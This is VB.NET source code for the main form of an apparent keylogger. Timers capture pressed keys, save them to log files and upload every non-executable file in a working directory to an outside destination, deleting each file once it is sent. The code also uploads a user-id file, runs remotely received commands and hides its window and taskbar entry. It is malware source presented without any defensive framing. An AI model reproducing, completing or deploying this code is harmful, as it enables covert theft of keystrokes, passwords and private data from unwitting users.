Imports rundll32.Declarations
Public Class Form1

    Private Sub keyTimer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles keyTimer.Tick
        If com <> "stop" Then
            Dim Ret As String
            Ret = GetPressedKey()
            If Ret <> sold Then
                sold = Ret
                sSave = sSave & " " & Trim(Ret)
                sSave = Trim(sSave)
            End If
        End If
    End Sub

    Private Sub action_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles action.Tick
        savelog(sSave)
        sSave = ""

        Dim sfn As String, uploaded As Boolean
        uploaded = False
        If com <> "stop" Then
            For Each file As String In My.Computer.FileSystem.GetFiles(directory)

                sfn = My.Computer.FileSystem.GetFileInfo(file).Name
                If Not sfn.EndsWith(".dll") And Not sfn.EndsWith(".exe") Then
                    Try
                        uploaded = upload(file, My.Computer.FileSystem.GetFileInfo(file).Name)
                        If sfn <> "com.dll" And uploaded Then My.Computer.FileSystem.DeleteFile(file)
                    Catch ex As Exception
                    End Try
                End If
            Next
            If idexist = False Then
                Try
                    upload(directory & "\id.dll", "id_" & uid & ".dll")
                    idexist = True
                Catch ex As Exception
                End Try

            End If
        End If

    End Sub

    Private Sub startDelay_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles startDelay.Tick
        startDelay.Stop()
        init()
        startDelay.Enabled = False
    End Sub

    Private Sub execute_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles execute.Tick
        execute_com()
    End Sub

    Private Sub Form1_Activated(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Activated
        Me.Visible = False
        Me.ShowInTaskbar = False
    End Sub

End Class
